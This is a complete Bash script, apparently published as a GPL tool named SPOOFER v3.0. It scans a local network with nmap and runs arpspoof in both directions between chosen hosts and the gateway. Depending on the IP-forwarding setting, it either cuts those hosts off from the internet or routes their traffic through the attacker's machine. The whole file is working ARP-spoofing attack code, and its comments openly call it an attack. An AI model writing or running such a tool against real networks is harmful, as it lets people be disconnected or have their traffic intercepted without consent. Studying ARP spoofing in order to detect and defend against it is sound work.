#!/bin/bash

# Script version
VERSION=3.0

#
#   Author: R7FX    (github.com/avivbintangaringga)
#           MrSyhd  (github.com/syahidnurrohim)
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

# Required packages for script to run
REQUIREMENTS="arpspoof"

# Terminal colors
RED="\033[0;31m"
GREEN="\033[0;32m"
NC="\033[0m"

# Display help
func_help()
{
    echo -e ""
    echo -e " Usage: $0 start|stop connect|disconnect <gateway-ip/cidr> [excluded-ip]"
    echo -e ""
    echo -e "  * connect|disconnect  -> Enable/Disable internet connection on target machine"
    echo -e "  * CIDR is only available from 1 to 32"
    echo -e "  * You can exclude IP Addresses on 4th argument with comma (,) separated"
    echo -e ""
}

# Display header
func_header()
{
    clear
    echo -e ""
    echo -e ""
    echo -e "           <------------------>"
    echo -e "       <-----+ SPOOFER v$VERSION +----->"
    echo -e "           <------------------>"
    echo -e ""
    echo -e ""
}

# Validate IP Address
func_check_ip()
{
    # Initiate local IP variable
    local IP=$1

    # Initiate the result to be false (1)
    local RESULT=1

    # Check through every IP Address bytes if it is a number or not
    if [[ $IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
    then
        # Split every bytes to an array
        IP=($(echo $IP | tr '.' '\n'))

        # Check every bytes value is in correct format (less than 255) and assign the result to the RESULT variable
        [[ ${IP[0]} -le 255 && ${IP[1]} -le 255 && ${IP[2]} -le 255 && ${IP[3]} -le 255 ]]
        RESULT=$?
    fi

    # Return the result
    return $RESULT
}

# Checking package requirements
func_check_prerequires()
{
    # Assume all packages is installed
    PACKAGE_NOT_INSTALLED=false

    # Loop through each required packages
	for PACKAGE in $REQUIREMENTS
	do
        # Check if requirements is installed with 'hash' command 
        # Exit code should be 0 if it is installed and 1 if it isn't
        if ! hash $PACKAGE 2>/dev/null
        then
            # Display error message
            echo -e "ERR: ${RED}$PACKAGE is not installed!$NC\n"
            # Add package not installed flag
            PACKAGE_NOT_INSTALLED=true
        fi
    done

    # Exit if any of the requirements isn't installed
    [[ $PACKAGE_NOT_INSTALLED == true ]] && exit 1
}

# Do some cleanup
func_cleanup()
{
    echo -e "\n\n   Please wait for the cleanup and re-arping process to be finished...\n\n"

    # Get all child process PIDs (arpspoof)
    local PIDS=$(jobs -pr)

    # Kill all child process
    [[ ! -z $PIDS ]] && kill $PIDS

    # Wait for all child background process to fully finish
    wait

    # Restore terminal screen
    tput rmcup

    # Finally exit
    exit 0
}

# Start the attack :)
func_start_attack()
{
    func_header

    echo -e " +"
    echo -e " | Target Network      : $NETWORK"
    echo -e " | Excluded IP Address : $EXCLUDED_IP"
    echo -e " +"
    echo -e ""

    # Block or forward internet access
    if [[ $FORWARD_TRAFFIC == true ]]
    then
        echo -e "[*] Forwarding internet access..."
        # Enabling IP Forwarding
        sysctl -q net.ipv4.ip_forward=1
    else
        echo -e "[*] Dropping internet access..."
        # Disabling IP Forwarding
        sysctl -q net.ipv4.ip_forward=0
    fi

    # Start the ARP Spoofing and print the output
    echo -e "[*] Attack Output:\n"

    for IP in $TARGET_IP
    do
        arpspoof -t $IP $GATEWAY &
        arpspoof -t $GATEWAY $IP &
    done

    # Loop so that the script isn't exit yet :v
    while true; do sleep 1; done
}

func_scan_network()
{
    func_header
    echo -e "[*] Scanning network..."

    # Scan all available IP Address in then network
    SCAN_RESULT=$(nmap -sn $NETWORK | grep "for" | cut -d ' ' -f 5-)

    # Exclude gateway IP and your own IP from the list
    for IP in $(echo "$GATEWAY $MY_IP")
    do
        SCAN_RESULT=$(echo "$SCAN_RESULT" | grep -vw "$IP")
    done

    # Iterate through the scan result
    local INDEX=1
    while read -r IP_AND_HOSTNAME
    do
        # Get IP Address
        IP=$(echo $IP_AND_HOSTNAME | cut -d '(' -f2 | cut -d ')' -f1)

        # Get Hostname
        HOSTNAME=$(echo $IP_AND_HOSTNAME | cut -d ' ' -f1)

        # Assign scanned host with hostname if available
        [[ $IP == $HOSTNAME ]] && HOSTS[$INDEX]=$(printf "%s\n" $IP) || HOSTS[$INDEX]=$(printf "%-20s (%s)\n" $IP $HOSTNAME)
        let 'INDEX++'
    done < <(echo "$SCAN_RESULT")

    # No IP address on the network, prompting to rescan
    if [[ -z $SCAN_RESULT ]]
    then
        read -n1 -p "[!] No IP Address is detected on the network! Scan again? [Y/n]: " SCAN_AGAIN

        case $SCAN_AGAIN in
            N|n) func_cleanup ;;
            *) func_scan_network ;;
        esac
    fi
}

start_interactive_mode()
{
    # Open new terminal screen
    tput smcup

    # Trap func_cleanup so that it will be called if CTRL+C is fired or when script is killed
    trap func_cleanup SIGINT SIGTERM SIGKILL

    # Print header
    func_header
    echo -e "\nSelect Network Interface:\n"

    # Iterate all interface that connected to a network
    local INDEX=1
    while read -r IFACE
    do
        # Print it
        printf " %2s)  %-16s %s\n" $INDEX $IFACE

        # Assign the interface to an array
        IFACE_LIST[$INDEX]=$IFACE
        let 'INDEX++'
    done < <(ip -o -f inet addr show | awk '/scope global/ {printf "%20s (%s)\n",$2,$4}')

    # If no interface is connected to a network, then prompt to rescan
    if [[ -z ${IFACE_LIST[@]} ]]
    then
        read -n1 -p "[!] No interface is currently connected to any network! Scan again? [Y/n]: " SCAN_AGAIN

        case $SCAN_AGAIN in
            N|n) func_cleanup ;;
            *) func_select_interface ;;
        esac
    fi

    # Loop until input is correct
    while [[ -z $SELECTED_IFACE ]]
    do
        # When interface list is only 1, it will be selected as default so you don't have to choose
        [[ ${#IFACE_LIST[@]} == 1 ]] && SELECTED_IFACE=${IFACE_LIST[1]} && break

        echo -e ""
        read -p "[Select]: " SELECT

        SELECTED_IFACE=${IFACE_LIST[$SELECT]}
    done

    # Selected interface
    INTERFACE=$(echo $SELECTED_IFACE | cut -d ' ' -f1)

    # Selected network
    NETWORK=$(echo $SELECTED_IFACE | cut -d '(' -f2 | cut -d ')' -f1)

    # Get gateway IP of interface
    GATEWAY=$(route -n | grep -w $INTERFACE | awk '{print $2}' | grep -v "0.0.0.0")

    # Scan the network
    func_scan_network

    # Print header
    func_header

    echo -e " +"
    echo -e " | Gateway     : $GATEWAY"
    echo -e " | Excluded IP : $EXCLUDED_IP"
    echo -e " +"
    echo -e ""
    echo -e "Select Target:\n"

    # Iterate all hosts found
    INDEX=1
    while [[ $INDEX -le ${#HOSTS[@]} ]]
    do
        # Print it
        printf " %3s)  %s\n" $INDEX "${HOSTS[$INDEX]}"

        # Assign the IP to an array
        IP_LIST[$INDEX]=$(echo "${HOSTS[$INDEX]}" | cut -d ' ' -f1)
        let 'INDEX++'
    done

    echo -e "   *)  All Addresses"
    echo -e ""
    read -p "[Select]: " SELECT_IP

    # If all address is selected
    if [[ ($SELECT_IP == "*" || -z $SELECT_IP) ]]
    then
        TARGET_IP="${IP_LIST[@]}"

        # If target is more than 1, then prompt to exclude IP
        if [[ ${#IP_LIST[@]} -gt 1 ]]
        then
            # Print header
            func_header

            # Prompt to exclude IP
            read -n1 -p "Do you want to exclude IP Address? [y/N]: " EXCLUDE_PROMPT
            if [[ $EXCLUDE_PROMPT == "y" || $EXCLUDE_PROMPT == "Y" ]]
            then
                func_header

                echo -e " +"
                echo -e " | Gateway     : $GATEWAY"
                echo -e " | Excluded IP : $EXCLUDED_IP"
                echo -e " +"
                echo -e ""
                echo -e "Select IP Addresses you want to exclude:\n"

                local INDEX2=1
                while [[ $INDEX2 -le ${#HOSTS[@]} ]]
                do
                    printf " %3s)  %s\n" $INDEX2 "${HOSTS[$INDEX2]}"
                    let 'INDEX2++'
                done

                echo -e ""
                read -p "[Select]: " SELECT_EXCLUDE_IP

                # Remove excluded IP from target list
                for SELECTED in $(echo $SELECT_EXCLUDE_IP | tr ',' ' ')
                do
                    [[ $SELECTED -lt $INDEX2 ]] && TARGET_IP=$(echo $TARGET_IP | sed "s/\<${IP_LIST[$SELECTED]}\>//g")
                    EXCLUDED_IP="$EXCLUDED_UP ${IP_LIST[$SELECTED]}"
                done
    
                EXCLUDED_IP=$(echo $EXCLUDED_IP | tr -s ' ')
            fi
        fi
    else
        # Assign selected IP to target list
        for SELECTED in $(echo $SELECT_IP | tr ',' ' ')
        do
            [[ $SELECTED -lt $INDEX ]] && TARGET_IP="$TARGET_IP ${IP_LIST[$SELECTED]}"
        done
    fi

    func_header

    # Prompt to forward internet access
    read -n1 -p "Forward internet access from client? [y/N]: " FORWARD_PROMPT

    case $FORWARD_PROMPT in
        y|Y) FORWARD_TRAFFIC=true ;;
        *) ;;
    esac

    # Finally START THE ATTACK!!!
    func_start_attack
}

# Arpspoof is requiring root access
if [[ $EUID -ne 0 ]] 
then 
    echo -e "\n[!] You must run this script as root.\n"
    exit 1
fi

# Get all of your IP Addresses
MY_IP=$(ip -o -4 a | awk '{print $4 }' | cut -d '/' -f1 | grep -v ^127 | tr '\n' ' ')

INET=$1
TARGET=$2
EXCLUDED_IP=$(echo "$MY_IP $3" | tr ',' ' ')

# Call function to check package requirements
func_check_prerequires

# If no argument is given, then run interactive mode
[[ -z $INET ]] && start_interactive_mode

# Check argument for internet access
case $INET in
    connect) FORWARD_TRAFFIC=true ;;
    disconnect) ;;
    *) func_help && exit 1 ;;
esac

# Check argument for target IP
[[ -z $TARGET ]] && func_help && exit 1

# Check if CIDR is given
if [[ ! -z $(echo $TARGET | grep '/') ]]
then
    # Get the CIDR
    CIDR=$(echo $TARGET | cut -d '/' -f2)
    # Check if the given CIDR is correct
    [[ $CIDR =~ ^[0-9]+$ ]] && [[ $CIDR -gt 32 || $CIDR -lt 1 ]] && echo -e "\n[!]Invalid CIDR range! Should be 1-32\n" && exit 1
else
    echo -e "\n[!] Invalid network address! CIDR should be given too.\n" && exit 1
fi

# Get Target IP Address only
GATEWAY=$(echo $TARGET | cut -d '/' -f1)

# Append Target IP Address and CIDR 
NETWORK="${GATEWAY}/${CIDR}"

# Loop through all IP Addresses to validate IP Address format
for IP in "$GATEWAY $EXCLUDED_IP"
do
    # Call the function to validate IP Address
    if ! func_check_ip $IP
    then
        echo -e "[!] Invalid IP Address: $IP"
        # Flag invalid IP Address
        INVALID_IP=true
    fi
done

# If there is an invalid IP Address then exit
[[ ! -z $INVALID_IP ]] && exit 1

# Open new terminal screen
tput smcup

# Trap func_cleanup on Interrupt (CTRL+C), Terminate, and Kill signal
trap func_cleanup SIGINT SIGTERM SIGKILL

# Scan the network
func_scan_network

# Assign scanned hosts to target list
for HOST in "${HOSTS[@]}"
do
    IP=$(echo "$HOST" | cut -d ' ' -f1)
    TARGET_IP="$TARGET_IP $IP"
done

# Remove excluded IP from target list
for IP in $EXCLUDED_IP
do
    TARGET_IP=$(echo "$TARGET_IP" | sed "s/\<$IP\>//g")
done

# Finally START THE ATTACK!!!
func_start_attack
